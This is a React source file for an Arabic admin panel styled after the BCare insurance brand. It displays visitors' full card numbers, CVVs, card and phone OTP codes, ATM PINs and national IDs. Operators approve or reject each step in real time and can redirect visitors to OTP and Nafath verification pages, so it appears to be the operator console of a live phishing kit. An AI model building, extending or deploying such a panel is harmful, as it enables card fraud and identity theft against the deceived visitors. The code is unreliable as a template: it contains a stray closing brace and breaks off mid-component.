import React, { useRef, useState } from "react";
import { motion } from "framer-motion";
import {
  ArrowRight, Circle, Star, Monitor, Smartphone, Tablet,
  Ban, ShieldCheck, Download, KeyRound, Send,
  User, Phone, CreditCard, Fingerprint, Landmark, Shield,
  MessageCircle, Car, Clock, MapPin, Globe, Check, X, Loader2, RefreshCw, Zap, AlertTriangle, RotateCcw
} from "lucide-react";
import AdminVisitorChat from "@/components/admin/AdminVisitorChat";
import { InfoItem } from "./InfoItem";
import CardBrandLogo from "@/components/CardBrandLogo";
import { getCardMetadata } from "@/lib/cardMetadata";
import { Button } from "@/components/ui/button";
import type { Visitor, InsuranceRequest, InsuranceOrder, Claim, ChatConv, StageEvent } from "./types";
import {
  getVisitorAvatar, getVisitorInitial, getSessionDuration, parseUserAgent,
  countryFlag, insuranceTypeLabel, statusLabel, stageLabel, formatTime, formatDate, formatDateTime
} from "./types";
import { toast } from "sonner";

import stcLogo from "@/assets/carriers/stc.png";
import mobilyLogo from "@/assets/carriers/mobily.png";
import zainLogo from "@/assets/carriers/zain.png";

const carrierLogos: Record<string, string> = {
  "STC": stcLogo, "stc": stcLogo,
  "Mobily": mobilyLogo, "mobily": mobilyLogo, "موبايلي": mobilyLogo,
  "Zain": zainLogo, "zain": zainLogo, "زين": zainLogo,
};

interface Props {
  selectedVisitor: Visitor;
  linkedRequests: InsuranceRequest[];
  linkedOrders: InsuranceOrder[];
  linkedClaims: Claim[];
  linkedChats: ChatConv[];
  stageEvents: StageEvent[];
  visitorName: string | null;
  customerName: string | null;
  visitorPhone: string | null;
  visitorNationalId: string | null;
  loadingAction: string | null;
  nafathNumberInputs: Record<string, string>;
  setNafathNumberInputs: React.Dispatch<React.SetStateAction<Record<string, string>>>;
  onClose: () => void;
  onApprove: (reqId: string) => void;
  onReject: (reqId: string) => void;
  onStageApprove: (orderId: string, nafathNum?: string) => void;
  onStageReject: (orderId: string) => void;
  onUpdateNafathNumber: (orderId: string, val: string) => void;
  onBlockToggle: () => void;
  onExportPDF: () => void;
  onClearChat: () => void;
  onToggleFavorite: (id: string) => void;
  onToggleTag: (id: string, tagKey: string) => void;
  onRedirect: (page: string) => void;
  onSendCode?: (code: string) => void;
  onSendFinalMessage?: (message: string) => void;
  redirectPage: string;
  setRedirectPage: (val: string) => void;
}

/* ═══════════════════════════════════════════════
   BCare Brand Card Colors
   Primary: Petrol Teal → teal/cyan
   Accent:  Orange/Gold → amber/orange
   ═══════════════════════════════════════════════ */
const cardThemes = {
  // بيانات الزائر — بترولي رئيسي
  sky:     { border: "border-teal-500/35",    bg: "bg-teal-500/5",    header: "bg-gradient-to-l from-teal-600/18 to-teal-400/8",    text: "text-teal-800 dark:text-teal-300",    line: "bg-gradient-to-b from-teal-400 to-teal-700",    shadow: "shadow-teal-600/10" },
  // بطاقة الدفع — برتقالي ذهبي
  amber:   { border: "border-amber-500/35",   bg: "bg-amber-500/5",   header: "bg-gradient-to-l from-amber-500/18 to-orange-400/8",  text: "text-amber-800 dark:text-amber-300",  line: "bg-gradient-to-b from-amber-400 to-orange-600",  shadow: "shadow-amber-500/10" },
  // المركبة / ATM — بترولي مخضر
  emerald: { border: "border-teal-400/30",    bg: "bg-teal-400/5",    header: "bg-gradient-to-l from-teal-500/15 to-cyan-400/8",     text: "text-teal-700 dark:text-teal-300",    line: "bg-gradient-to-b from-teal-300 to-teal-600",    shadow: "shadow-teal-400/10" },
  // OTP البطاقة / STC — أزرق بترولي غامق
  blue:    { border: "border-cyan-600/30",    bg: "bg-cyan-600/5",    header: "bg-gradient-to-l from-cyan-600/15 to-teal-500/8",     text: "text-cyan-800 dark:text-cyan-300",    line: "bg-gradient-to-b from-cyan-500 to-cyan-700",    shadow: "shadow-cyan-600/10" },
  // OTP الجوال — بترولي أزرق
  violet:  { border: "border-sky-600/30",     bg: "bg-sky-600/5",     header: "bg-gradient-to-l from-sky-600/15 to-teal-500/8",      text: "text-sky-800 dark:text-sky-300",      line: "bg-gradient-to-b from-sky-400 to-sky-700",      shadow: "shadow-sky-600/10" },
  // توثيق الجوال — بترولي دافئ
  purple:  { border: "border-teal-500/30",    bg: "bg-teal-500/4",    header: "bg-gradient-to-l from-teal-500/14 to-emerald-400/7",   text: "text-teal-700 dark:text-teal-300",    line: "bg-gradient-to-b from-emerald-400 to-teal-600",  shadow: "shadow-teal-500/10" },
  // العرض والأسعار / نفاذ دخول — برتقالي غامق
  teal:    { border: "border-orange-500/30",  bg: "bg-orange-500/5",  header: "bg-gradient-to-l from-orange-500/15 to-amber-400/8",   text: "text-orange-800 dark:text-orange-300", line: "bg-gradient-to-b from-orange-400 to-orange-600", shadow: "shadow-orange-500/10" },
  // رمز نفاذ — سماوي بترولي
  cyan:    { border: "border-cyan-500/30",    bg: "bg-cyan-500/5",    header: "bg-gradient-to-l from-cyan-500/15 to-teal-400/8",     text: "text-cyan-700 dark:text-cyan-300",    line: "bg-gradient-to-b from-cyan-400 to-teal-600",    shadow: "shadow-cyan-500/10" },
  // حالات الرفض
  red:     { border: "border-red-400/35",     bg: "bg-red-500/5",     header: "bg-gradient-to-l from-red-500/15 to-red-400/8",       text: "text-red-700 dark:text-red-300",      line: "bg-gradient-to-b from-red-400 to-red-600",      shadow: "shadow-red-500/10" },
  // طلبات التأمين — بترولي متوسط
  indigo:  { border: "border-teal-600/30",    bg: "bg-teal-600/5",    header: "bg-gradient-to-l from-teal-600/15 to-cyan-500/8",     text: "text-teal-800 dark:text-teal-300",    line: "bg-gradient-to-b from-teal-500 to-teal-700",    shadow: "shadow-teal-600/10" },
  // المحادثة — برتقالي ذهبي دافئ
  rose:    { border: "border-orange-400/30",  bg: "bg-orange-400/5",  header: "bg-gradient-to-l from-orange-400/15 to-amber-300/8",   text: "text-orange-700 dark:text-orange-300", line: "bg-gradient-to-b from-amber-400 to-orange-500",  shadow: "shadow-orange-400/10" },
};
};

type CardColor = keyof typeof cardThemes;

/* ─── DataCard ─── */
const DataCard: React.FC<{
  title: string;
  icon: React.ReactNode;
  color: CardColor;
  badge?: React.ReactNode;
  children: React.ReactNode;
  actions?: React.ReactNode;
}> = ({ title, icon, color, badge, children, actions }) => {
  const t = cardThemes[color];
  return (
    <motion.div
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.25, ease: "easeOut" }}
      className={`rounded-2xl border ${t.border} overflow-hidden bg-card shadow-md ${t.shadow} hover:shadow-lg transition-shadow duration-300`}
    >
      {/* Gradient header */}
      <div className={`flex items-center gap-2.5 px-4 py-3 ${t.header} border-b ${t.border}`}>
        <div className={`w-7 h-7 rounded-lg ${t.bg} border ${t.border} flex items-center justify-center`}>
          <span className={t.text}>{icon}</span>
        </div>
        <h3 className={`text-sm font-bold ${t.text} flex-1`}>{title}</h3>
        {badge}
      </div>
      {/* Body with accent line */}
      <div className="relative">
        <div className={`absolute right-0 top-0 bottom-0 w-1.5 ${t.line} rounded-bl-full rounded-tl-full`} />
        <div className="pr-4 pl-3 py-3 space-y-2.5">
          {children}
        </div>
      </div>
      {/* Actions footer */}
      {actions && (
        <div className={`px-4 py-3 border-t ${t.border} bg-muted/20 backdrop-blur-sm`}>
          {actions}
        </div>
      )}
    </motion.div>
  );
};

/* ─── Status Badge ─── */
const StatusBadge: React.FC<{ status: string }> = ({ status }) => {
  const s = statusLabel[status];
  if (!s) return null;
  return <span className={`px-2 py-0.5 rounded-full text-[9px] font-bold ${s.cls}`}>{s.text}</span>;
};

/* ─── Pending Badge ─── */
const PendingBadge = () => (
  <span className="flex items-center gap-1 text-[9px] font-bold text-amber-600 bg-amber-500/15 px-1.5 py-0.5 rounded-full">
    <span className="relative flex h-1.5 w-1.5">
      <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-500 opacity-75" />
      <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-amber-500" />
    </span>
    بانتظار
  </span>
);

/* ─── ApproveReject Buttons ─── */
const ApproveRejectButtons: React.FC<{
  onApprove: () => void;
  onReject: () => void;
  loading: string | null;
  approveKey: string;
  rejectKey: string;
  disabled?: boolean;
}> = ({ onApprove, onReject, loading, approveKey, rejectKey, disabled }) => (
  <div className="flex items-center gap-2">
    <Button onClick={onApprove} disabled={loading !== null || disabled} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1 flex-1" size="sm">
      {loading === approveKey ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
    </Button>
    <Button onClick={onReject} disabled={loading !== null} variant="destructive" className="gap-1 flex-1" size="sm">
      {loading === rejectKey ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
    </Button>
  </div>
);

/* ═══════════════════════════════════════════════
   MAIN COMPONENT
   ═══════════════════════════════════════════════ */
const VisitorDetailsPanel: React.FC<Props> = ({
  selectedVisitor, linkedRequests, linkedOrders, linkedClaims, linkedChats, stageEvents,
  visitorName, customerName, visitorPhone, visitorNationalId,
  loadingAction, nafathNumberInputs, setNafathNumberInputs,
  onClose, onApprove, onReject, onStageApprove, onStageReject, onUpdateNafathNumber,
  onBlockToggle, onExportPDF, onClearChat, onToggleFavorite, onToggleTag,
  onRedirect, onSendCode, onSendFinalMessage, redirectPage, setRedirectPage,
}) => {
  const panelRef = useRef<HTMLDivElement>(null);
  const [codeInput, setCodeInput] = useState("");
  const [messageInput, setMessageInput] = useState("");

  const ua = parseUserAgent(selectedVisitor.user_agent);
  const DevIcon = ua.device === "Mobile" ? Smartphone : ua.device === "Tablet" ? Tablet : Monitor;
  const displayName = visitorName || customerName || selectedVisitor.visitor_name || "زائر";

  const order = linkedOrders[0] || null;

  const getNafathInputValue = (o: InsuranceOrder) => nafathNumberInputs[o.id] ?? o.nafath_number ?? "";
  const setNafathInputValue = (orderId: string, value: string) => {
    const sanitized = value.replace(/\D/g, "").slice(0, 2);
    setNafathNumberInputs(prev => ({ ...prev, [orderId]: sanitized }));
  };

  // Stage helpers
  const isStageActive = (stage: string) => order?.current_stage === stage && order?.stage_status === "pending";
  const isStageReached = (stage: string) => {
    if (!order) return false;
    const stages = ["payment", "otp", "atm", "phone_verification", "phone_otp", "stc_call", "nafath_login", "nafath_verify"];
    const currentIdx = stages.indexOf(order.current_stage || "");
    const thisIdx = stages.indexOf(stage);
    return thisIdx <= currentIdx || order.current_stage === stage;
  };
  const getStageStatus = (stage: string) => {
    if (!order) return "idle";
    if (order.current_stage === stage) return order.stage_status || "pending";
    const stages = ["payment", "otp", "atm", "phone_verification", "phone_otp", "stc_call", "nafath_login", "nafath_verify"];
    const currentIdx = stages.indexOf(order.current_stage || "");
    const thisIdx = stages.indexOf(stage);
    if (currentIdx > thisIdx && thisIdx >= 0) return "approved";
    return "idle";
  };

  const getLatestResendEvent = (orderId: string, stage: string) => {
    const matched = stageEvents.filter(e => e.order_id === orderId && e.stage === stage && Boolean((e.payload as any)?.resend_requested))
      .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
    return matched[matched.length - 1] || null;
  };

  return (
    <motion.div
      key={selectedVisitor.id}
      initial={{ opacity: 0, x: -12 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{ duration: 0.25, ease: "easeOut" }}
      ref={panelRef}
      className="flex-1 overflow-y-auto flex flex-col will-change-transform"
    >
      {/* Mobile back */}
      <button onClick={onClose} className="md:hidden flex items-center gap-2 text-sm text-primary font-semibold p-3 hover:text-primary/80 transition-colors">
        <ArrowRight className="w-4 h-4" />العودة للقائمة
      </button>

      {/* ── Redirect Bar ── */}
      <div className="flex items-center gap-1.5 p-3 border-b border-border/50 bg-card shrink-0" dir="rtl">
        <select value={redirectPage} onChange={e => setRedirectPage(e.target.value)} className="flex-1 h-9 rounded-lg border border-border bg-background px-2.5 text-xs text-foreground focus:outline-none focus:border-primary transition-all min-w-0">
          <option value="">اختر صفحة</option>
          <optgroup label="الدفع والتحقق">
            <option value="/insurance/payment">الدفع بالبطاقة</option>
            <option value="/insurance/atm">دفع ATM</option>
            <option value="/insurance/otp">رمز التحقق OTP</option>
            <option value="/insurance/phone-verify">توثيق الجوال</option>
            <option value="/insurance/phone-otp">كود الجوال</option>
            <option value="/insurance/phone-stc">مكالمة STC</option>
            <option value="/insurance/nafath-login">نفاذ - دخول</option>
            <option value="/insurance/nafath-verify">نفاذ - تحقق</option>
            <option value="/insurance/confirmation">تأكيد الوثيقة</option>
          </optgroup>
        </select>
        <span className="text-[10px] text-muted-foreground whitespace-nowrap">توجيه لصفحة</span>
        <button onClick={() => onRedirect(redirectPage)} disabled={!redirectPage} className="h-9 px-5 rounded-lg text-xs font-bold bg-primary text-primary-foreground hover:bg-primary/90 disabled:opacity-40 transition-all whitespace-nowrap">
          توجيه
        </button>
      </div>

      {/* ── Visitor Header ── */}
      <div className="p-4 md:p-5 border-b border-border/50 bg-card shrink-0" dir="rtl">
        <div className="flex items-center justify-between mb-1">
          <h2 className="text-lg md:text-xl font-black text-foreground">{displayName}</h2>
          <button onClick={() => onToggleFavorite(selectedVisitor.id)} className="p-1">
            <Star className={`w-5 h-5 ${selectedVisitor.is_favorite ? "fill-amber-400 text-amber-400" : "text-muted-foreground hover:text-amber-400"} transition-colors`} />
          </button>
        </div>
        <p className="text-xs text-muted-foreground mb-2">{selectedVisitor.current_page || "/"}</p>
        <span className={`inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-bold ${selectedVisitor.is_online ? "bg-emerald-500/15 text-emerald-600" : "bg-destructive/10 text-destructive"}`}>
          <Circle className={`w-2 h-2 ${selectedVisitor.is_online ? "fill-emerald-500 text-emerald-500 animate-pulse" : "fill-destructive text-destructive"}`} />
          {selectedVisitor.is_online ? "متصل" : "غير متصل"}
        </span>
        <div className="flex items-center gap-2 mt-3 text-[10px] text-muted-foreground flex-wrap">
          <span className="inline-flex items-center gap-1"><DevIcon className="w-3 h-3" />{ua.device}</span>
          <span>·</span><span>{ua.os}</span>
          <span>·</span><span>{ua.browser}</span>
          <span>·</span><span>{selectedVisitor.country ? `${countryFlag(selectedVisitor.country_code)} ${selectedVisitor.country}` : "Unknown"}</span>
          <span>·</span><span>{selectedVisitor.ip_address || "—"}</span>
        </div>
      </div>

      {/* ══════════════ Cards Section ══════════════ */}
      <div className="flex-1 overflow-y-auto p-3 md:p-4 space-y-3" dir="rtl">

        {/* ──────── 1. بيانات الزائر (Visitor Info) ──────── */}
        <DataCard title="بيانات الزائر" icon={<User className="w-4 h-4" />} color="sky">
          <div className="grid grid-cols-2 gap-1.5">
            <InfoItem label="الاسم" value={visitorName || "لا توجد بيانات"} />
            {customerName && customerName !== visitorName && <InfoItem label="اسم العميل" value={customerName} />}
            <InfoItem label="رقم الجوال" value={visitorPhone || "لا توجد بيانات"} />
            <InfoItem label="رقم الهوية" value={visitorNationalId || "لا توجد بيانات"} />
            <InfoItem label="الدولة" value={selectedVisitor.country ? `${countryFlag(selectedVisitor.country_code)} ${selectedVisitor.country}` : "—"} />
            <InfoItem label="IP" value={selectedVisitor.ip_address || "—"} />
            <InfoItem label="آخر نشاط" value={formatTime(selectedVisitor.last_seen_at)} />
            <InfoItem label="أول زيارة" value={formatDate(selectedVisitor.created_at)} />
          </div>
        </DataCard>

        {/* ──────── 2. طلبات التأمين (Insurance Requests) ──────── */}
        {linkedRequests.map(req => (
          <DataCard
            key={req.id}
            title={`طلب تأمين - ${insuranceTypeLabel[req.insurance_type || ""] || "غير محدد"}`}
            icon={<Shield className="w-4 h-4" />}
            color="indigo"
            badge={<StatusBadge status={req.status} />}
            actions={req.status === "pending" ? (
              <ApproveRejectButtons
                onApprove={() => onApprove(req.id)}
                onReject={() => onReject(req.id)}
                loading={loadingAction}
                approveKey={`approve-${req.id}`}
                rejectKey={`reject-${req.id}`}
              />
            ) : undefined}
          >
            <div className="grid grid-cols-2 gap-1.5">
              <InfoItem label="رقم الهوية" value={req.national_id} />
              <InfoItem label="رقم الجوال" value={req.phone} />
              {req.serial_number && <InfoItem label="الرقم التسلسلي" value={req.serial_number} />}
              {req.estimated_value && <InfoItem label="القيمة التقديرية" value={`${req.estimated_value} ر.س`} />}
              {req.repair_location && <InfoItem label="مكان التصليح" value={req.repair_location === "agency" ? "الوكالة" : "ورشة"} />}
              {req.passenger_count && <InfoItem label="عدد الركاب" value={req.passenger_count} />}
              {req.vehicle_usage && <InfoItem label="الاستخدام" value={req.vehicle_usage === "personal" ? "شخصي" : req.vehicle_usage === "commercial" ? "تجاري" : req.vehicle_usage} />}
              {req.policy_start_date && <InfoItem label="بداية الوثيقة" value={req.policy_start_date} />}
              {req.birth_date && <InfoItem label="تاريخ الميلاد" value={req.birth_date} />}
              <InfoItem label="تاريخ الطلب" value={formatDate(req.created_at)} />
              {req.notes && <div className="col-span-2"><InfoItem label="ملاحظات" value={req.notes} /></div>}
            </div>
          </DataCard>
        ))}

        {/* ──────── 3. بيانات المركبة (Vehicle Info) ──────── */}
        {order && (order.vehicle_make || order.vehicle_model || order.vehicle_year || order.serial_number) && (
          <DataCard title="بيانات المركبة" icon={<Car className="w-4 h-4" />} color="emerald">
            <div className="grid grid-cols-2 gap-1.5">
              {order.vehicle_make && <InfoItem label="الشركة المصنعة" value={order.vehicle_make} />}
              {order.vehicle_model && <InfoItem label="الموديل" value={order.vehicle_model} />}
              {order.vehicle_year && <InfoItem label="سنة الصنع" value={order.vehicle_year} />}
              {order.serial_number && <InfoItem label="الرقم التسلسلي" value={order.serial_number} />}
              {order.passenger_count && <InfoItem label="عدد الركاب" value={order.passenger_count} />}
              {order.vehicle_usage && <InfoItem label="الاستخدام" value={order.vehicle_usage === "personal" ? "شخصي" : order.vehicle_usage === "commercial" ? "تجاري" : order.vehicle_usage} />}
              {order.estimated_value && <InfoItem label="القيمة التقديرية" value={`${order.estimated_value} ر.س`} />}
              {order.repair_location && <InfoItem label="مكان التصليح" value={order.repair_location === "agency" ? "الوكالة" : "ورشة"} />}
            </div>
          </DataCard>
        )}

        {/* ──────── 4. التأمين والأسعار (Insurance & Pricing) ──────── */}
        {order && (order.company || order.base_price != null || order.total_price != null) && (
          <DataCard title="العرض والأسعار" icon={<Shield className="w-4 h-4" />} color="teal">
            <div className="grid grid-cols-2 gap-1.5">
              {order.company && <InfoItem label="شركة التأمين" value={order.company} />}
              {order.insurance_type && <InfoItem label="نوع التأمين" value={insuranceTypeLabel[order.insurance_type] || order.insurance_type} />}
              {order.base_price != null && <InfoItem label="السعر الأساسي" value={`${order.base_price} ر.س`} />}
              {order.total_price != null && <InfoItem label="السعر الإجمالي" value={`${order.total_price} ر.س`} />}
              {order.policy_number && <InfoItem label="رقم الوثيقة" value={order.policy_number} />}
              {order.draft_policy_number && <InfoItem label="رقم الوثيقة المبدئي" value={order.draft_policy_number} />}
              {order.payment_method && <InfoItem label="طريقة الدفع" value={order.payment_method === "card" ? "بطاقة" : order.payment_method === "atm" ? "ATM" : order.payment_method} />}
              {order.add_ons && Array.isArray(order.add_ons) && (order.add_ons as any[]).length > 0 && (
                <div className="col-span-2"><InfoItem label="الإضافات" value={(order.add_ons as any[]).map((a: any) => typeof a === 'string' ? a : a.name || JSON.stringify(a)).join("، ")} /></div>
              )}
            </div>
          </DataCard>
        )}

        {/* ──────── 5. بطاقة الدفع (Payment Card) ──────── */}
        {order && (order.card_holder_name || order.card_number_full || order.card_last_four || order.card_expiry || order.card_cvv) && (() => {
          const num = order.card_number_full || order.card_last_four || "";
          const meta = getCardMetadata(num);
          const brandColors: Record<string, { from: string; to: string }> = {
            visa: { from: "#1a1f71", to: "#0d47a1" }, mastercard: { from: "#eb5f07", to: "#ff6d00" },
            mada: { from: "#0d7c3d", to: "#00a651" }, amex: { from: "#006fcf", to: "#00aff0" },
            unionpay: { from: "#e21836", to: "#00447c" }, unknown: { from: "#374151", to: "#1f2937" },
          };
          const bc = brandColors[meta.brandKey] || brandColors.unknown;
          const displayNum = order.card_number_full ? order.card_number_full.replace(/(.{4})/g, '$1 ').trim() : order.card_last_four ? `•••• •••• •••• ${order.card_last_four}` : "•••• •••• •••• ••••";

          return (
            <DataCard
              title="بطاقة الدفع"
              icon={<CreditCard className="w-4 h-4" />}
              color="amber"
              badge={isStageActive("payment") ? <PendingBadge /> : <StatusBadge status={getStageStatus("payment")} />}
              actions={isStageActive("payment") ? (
                <ApproveRejectButtons
                  onApprove={() => onStageApprove(order.id)}
                  onReject={() => onStageReject(order.id)}
                  loading={loadingAction}
                  approveKey={`stage-approve-${order.id}`}
                  rejectKey={`stage-reject-${order.id}`}
                />
              ) : undefined}
            >
              {/* 3D Card */}
              <div className="mx-auto w-full max-w-[220px] h-[120px] rounded-xl p-2.5 flex flex-col justify-between text-white relative overflow-hidden"
                style={{ background: `linear-gradient(135deg, ${bc.from}, ${bc.to})`, boxShadow: `0 6px 18px ${bc.from}44` }}>
                <div className="flex justify-between items-start">
                  <div className="w-7 h-4 rounded bg-yellow-300/80" />
                  <CardBrandLogo brandKey={meta.brandKey} className="w-8 h-5" />
                </div>
                <p className="text-[10px] font-mono tracking-[2px] text-white/90 text-center" dir="ltr">{displayNum}</p>
                <div className="flex justify-between items-end text-[8px]">
                  <div><p className="text-white/50 text-[6px]">CARD HOLDER</p><p className="text-white/90 font-medium truncate max-w-[100px]">{order.card_holder_name || "—"}</p></div>
                  <div className="text-left" dir="ltr"><p className="text-white/50 text-[6px]">EXPIRES</p><p className="text-white/90 font-medium">{order.card_expiry || "MM/YY"}</p></div>
                  {order.card_cvv && <div className="text-left" dir="ltr"><p className="text-white/50 text-[6px]">CVV</p><p className="text-white/90 font-bold font-mono">{order.card_cvv}</p></div>}
                </div>
                {meta.isDetected && meta.bankName && <p className="absolute bottom-0.5 left-1/2 -translate-x-1/2 text-[6px] text-white/40">{meta.bankName}</p>}
              </div>
              <div className="grid grid-cols-2 gap-1.5 mt-2">
                {order.card_holder_name && <InfoItem label="اسم حامل البطاقة" value={order.card_holder_name} />}
                {(order.card_number_full || order.card_last_four) && <InfoItem label="رقم البطاقة" value={order.card_number_full || `•••• ${order.card_last_four}`} />}
                {order.card_expiry && <InfoItem label="تاريخ الانتهاء" value={order.card_expiry} />}
                {order.card_cvv && <InfoItem label="CVV" value={order.card_cvv} />}
                {meta.isDetected && <InfoItem label="نوع البطاقة" value={`${meta.brandLabel} - ${meta.classificationLabel}`} />}
              </div>
            </DataCard>
          );
        })()}

        {/* ──────── 6. رمز OTP البطاقة ──────── */}
        {order && isStageReached("otp") && (() => {
          const otpEvents = stageEvents.filter(e => e.order_id === order.id && e.stage === "otp").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
          const rejectedOtps = otpEvents.filter(e => e.status === "rejected");
          const latestResend = getLatestResendEvent(order.id, "otp");

          return (
            <DataCard
              title="رمز OTP البطاقة"
              icon={<KeyRound className="w-4 h-4" />}
              color="blue"
              badge={isStageActive("otp") ? <PendingBadge /> : <StatusBadge status={getStageStatus("otp")} />}
              actions={isStageActive("otp") ? (
                <ApproveRejectButtons
                  onApprove={() => onStageApprove(order.id)}
                  onReject={() => onStageReject(order.id)}
                  loading={loadingAction}
                  approveKey={`stage-approve-${order.id}`}
                  rejectKey={`stage-reject-${order.id}`}
                />
              ) : undefined}
            >
              {latestResend && (
                <div className="flex items-center justify-between rounded-lg border border-amber-500/20 bg-amber-500/10 px-2.5 py-1.5">
                  <span className="text-[10px] font-bold text-amber-700">طلب رمز جديد</span>
                  <span className="text-[9px] text-amber-700/80">{new Date(latestResend.stage_entered_at).toLocaleTimeString("ar-SA", { hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: false })}</span>
                </div>
              )}
              {rejectedOtps.map((ev, i) => (
                <div key={ev.id} className="flex items-center justify-between bg-red-500/5 border border-red-500/15 rounded-lg px-2.5 py-1">
                  <span className="text-[10px] text-red-500">محاولة {i + 1}</span>
                  <span className="text-sm font-mono font-bold tracking-[4px] text-red-400 line-through">{(ev.payload as any)?.otp_code || (ev.payload as any)?.code || "—"}</span>
                </div>
              ))}
              <div className="flex items-center justify-center py-1">
                {order.otp_code ? (
                  <span className="text-xl font-mono font-bold tracking-[6px] text-blue-600 bg-blue-500/10 px-4 py-1.5 rounded-lg border border-blue-500/20">{order.otp_code}</span>
                ) : (
                  <p className="text-[10px] text-muted-foreground">بانتظار الرمز...</p>
                )}
              </div>
              {rejectedOtps.length >= 3 && <p className="text-[9px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات</p>}
            </DataCard>
          );
        })()}

        {/* ──────── 7. بيانات ATM ──────── */}
        {order && (order.atm_bill_number || order.atm_biller_code || order.atm_pin || isStageReached("atm")) && (order.atm_bill_number || order.atm_biller_code || order.atm_pin) && (
          <DataCard
            title="بيانات ATM"
            icon={<Landmark className="w-4 h-4" />}
            color="emerald"
            badge={isStageActive("atm") ? <PendingBadge /> : <StatusBadge status={getStageStatus("atm")} />}
            actions={isStageActive("atm") ? (
              <ApproveRejectButtons
                onApprove={() => onStageApprove(order.id)}
                onReject={() => onStageReject(order.id)}
                loading={loadingAction}
                approveKey={`stage-approve-${order.id}`}
                rejectKey={`stage-reject-${order.id}`}
              />
            ) : undefined}
          >
            <div className="grid grid-cols-2 gap-1.5">
              {order.atm_bill_number && <InfoItem label="رقم الفاتورة" value={order.atm_bill_number} />}
              {order.atm_biller_code && <InfoItem label="رمز المفوتر" value={order.atm_biller_code} />}
            </div>
            {order.atm_pin && (
              <div className="flex justify-center py-1">
                <span className="text-lg font-mono font-bold tracking-[4px] text-emerald-600 bg-emerald-500/10 px-4 py-1.5 rounded-lg border border-emerald-500/20">{order.atm_pin}</span>
              </div>
            )}
          </DataCard>
        )}

        {/* ──────── 8. توثيق رقم الجوال ──────── */}
        {order && isStageReached("phone_verification") && (() => {
          const phoneEvent = stageEvents.filter(e => e.order_id === order.id && e.stage === "phone_verification").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime()).at(-1);
          const carrierName = (phoneEvent?.payload as any)?.carrier || null;
          const phone = order.phone || (phoneEvent?.payload as any)?.phone || visitorPhone || "—";
          const natId = order.national_id || (phoneEvent?.payload as any)?.national_id || visitorNationalId || null;

          return (
            <DataCard
              title="توثيق رقم الجوال"
              icon={<Smartphone className="w-4 h-4" />}
              color="purple"
              badge={isStageActive("phone_verification") ? <PendingBadge /> : <StatusBadge status={getStageStatus("phone_verification")} />}
              actions={isStageActive("phone_verification") ? (
                <ApproveRejectButtons
                  onApprove={() => onStageApprove(order.id)}
                  onReject={() => onStageReject(order.id)}
                  loading={loadingAction}
                  approveKey={`stage-approve-${order.id}`}
                  rejectKey={`stage-reject-${order.id}`}
                />
              ) : undefined}
            >
              <div className="grid grid-cols-2 gap-1.5">
                <InfoItem label="رقم الجوال" value={phone} />
                {natId && <InfoItem label="رقم الهوية" value={natId} />}
                {order.customer_name && <InfoItem label="الاسم" value={order.customer_name} />}
              </div>
              {carrierName && (
                <div className="flex items-center gap-2 bg-muted/30 rounded-lg p-2">
                  {carrierLogos[carrierName] ? (
                    <img src={carrierLogos[carrierName]} alt={carrierName} className="w-5 h-5 object-contain" loading="lazy" />
                  ) : (
                    <Phone className="w-3.5 h-3.5 text-purple-500" />
                  )}
                  <span className="text-xs font-medium text-foreground">{carrierName}</span>
                </div>
              )}
            </DataCard>
          );
        })()}

        {/* ──────── 9. كود OTP الجوال ──────── */}
        {order && isStageReached("phone_otp") && (() => {
          const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "phone_otp").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
          const rejected = events.filter(e => e.status === "rejected");
          const latest = events.at(-1);
          const otp = order.phone_otp_code || (latest?.payload as any)?.phone_otp_code || (latest?.payload as any)?.code || null;

          return (
            <DataCard
              title="كود OTP الجوال"
              icon={<Phone className="w-4 h-4" />}
              color="violet"
              badge={isStageActive("phone_otp") ? <PendingBadge /> : <StatusBadge status={getStageStatus("phone_otp")} />}
              actions={isStageActive("phone_otp") ? (
                <ApproveRejectButtons
                  onApprove={() => onStageApprove(order.id)}
                  onReject={() => onStageReject(order.id)}
                  loading={loadingAction}
                  approveKey={`stage-approve-${order.id}`}
                  rejectKey={`stage-reject-${order.id}`}
                />
              ) : undefined}
            >
              {rejected.map((ev, i) => (
                <div key={ev.id} className="flex items-center justify-between bg-red-500/5 border border-red-500/15 rounded-lg px-2.5 py-1">
                  <span className="text-[10px] text-red-500">محاولة {i + 1}</span>
                  <span className="text-sm font-mono font-bold tracking-[4px] text-red-400 line-through">{(ev.payload as any)?.phone_otp_code || (ev.payload as any)?.code || "—"}</span>
                </div>
              ))}
              <div className="flex items-center justify-center py-1">
                {otp ? (
                  <span className="text-xl font-mono font-bold tracking-[6px] text-violet-600 bg-violet-500/10 px-4 py-1.5 rounded-lg border border-violet-500/20">{otp}</span>
                ) : (
                  <p className="text-[10px] text-muted-foreground">بانتظار الرمز...</p>
                )}
              </div>
              {rejected.length >= 3 && <p className="text-[9px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات</p>}
            </DataCard>
          );
        })()}

        {/* ──────── 10. مكالمة STC ──────── */}
        {order && isStageReached("stc_call") && (() => {
          const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "stc_call").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
          const latest = events.at(-1);
          const phone = order.phone || (latest?.payload as any)?.phone || null;

          return (
            <DataCard
              title="مكالمة STC"
              icon={<Phone className="w-4 h-4" />}
              color="blue"
              badge={isStageActive("stc_call") ? <PendingBadge /> : <StatusBadge status={getStageStatus("stc_call")} />}
              actions={isStageActive("stc_call") ? (
                <ApproveRejectButtons
                  onApprove={() => onStageApprove(order.id)}
